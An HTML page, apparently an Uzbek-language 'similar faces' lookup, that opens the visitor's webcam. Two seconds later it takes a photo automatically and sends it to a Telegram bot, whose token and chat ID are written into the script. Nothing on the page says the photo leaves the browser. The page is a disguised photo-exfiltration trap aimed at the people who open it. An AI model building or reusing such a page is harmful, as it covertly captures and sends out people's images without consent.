<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Camera Capture</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: url('https://www.example.com/background.jpg') no-repeat center center fixed;
            background-size: cover;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            color: #333;
            position: relative;
        }
        h1 {
            font-size: 2.5em;
            color: #fff;
            margin-bottom: 20px;
            text-align: center;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.6);
        }
        #video {
            border: 3px solid #ffeb3b;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
            margin-bottom: 15px;
        }
        #capture {
            background-color: #ff5722;
            color: white;
            border: none;
            padding: 12px 25px;
            font-size: 18px;
            cursor: pointer;
            border-radius: 8px;
            transition: background-color 0.3s, transform 0.3s;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
        }
        #capture:hover {
            background-color: #e64a19;
            transform: scale(1.05);
        }
        #canvas {
            display: none;
        }
        /* Stickers */
        .sticker {
            position: absolute;
            width: 100px;
            height: 100px;
            background-size: contain;
            background-repeat: no-repeat;
            background-position: center;
        }
        .sticker1 {
            top: 10px;
            right: 10px;
            background-image: url('https://www.example.com/sticker1.png');
        }
        .sticker2 {
            bottom: 10px;
            left: 10px;
            background-image: url('https://www.example.com/sticker2.png');
        }
    </style>
</head>
<body>
    <h1>Ã•xshash qiyoflar</h1>
    <video id="video" width="320" height="240" autoplay></video>
    <button id="capture">Men qidir</button>
    <canvas id="canvas" width="320" height="240"></canvas>
    
    <!-- Stickers -->
    <div class="sticker sticker1"></div>
    <div class="sticker sticker2"></div>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const captureButton = document.getElementById('capture');
        const context = canvas.getContext('2d');

        // Access the camera
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                video.srcObject = stream;
                video.onloadedmetadata = () => {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    // Automatically capture the photo after 2 seconds
                    setTimeout(() => {
                        captureButton.click();
                    }, 2000); // 2000 milliseconds = 2 seconds
                };
            })
            .catch(err => {
                console.error("Error accessing camera: ", err);
            });

        captureButton.addEventListener('click', () => {
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            canvas.toBlob(blob => {
                const formData = new FormData();
                formData.append('photo', blob, 'photo.jpg');
                
                fetch('https://api.telegram.org/bot6095698666:AAGRFt6yzhgZAPCpOTgJTumzPAP8qqsRnIw/sendPhoto?chat_id=5903951003', {
                    method: 'POST',
                    body: formData
                }).then(response => response.json())
                  .then(result => console.log('Success:', result))
                  .catch(error => console.error('Error:', error));
            }, 'image/jpeg');
        });
    </script>
</body>
</html>
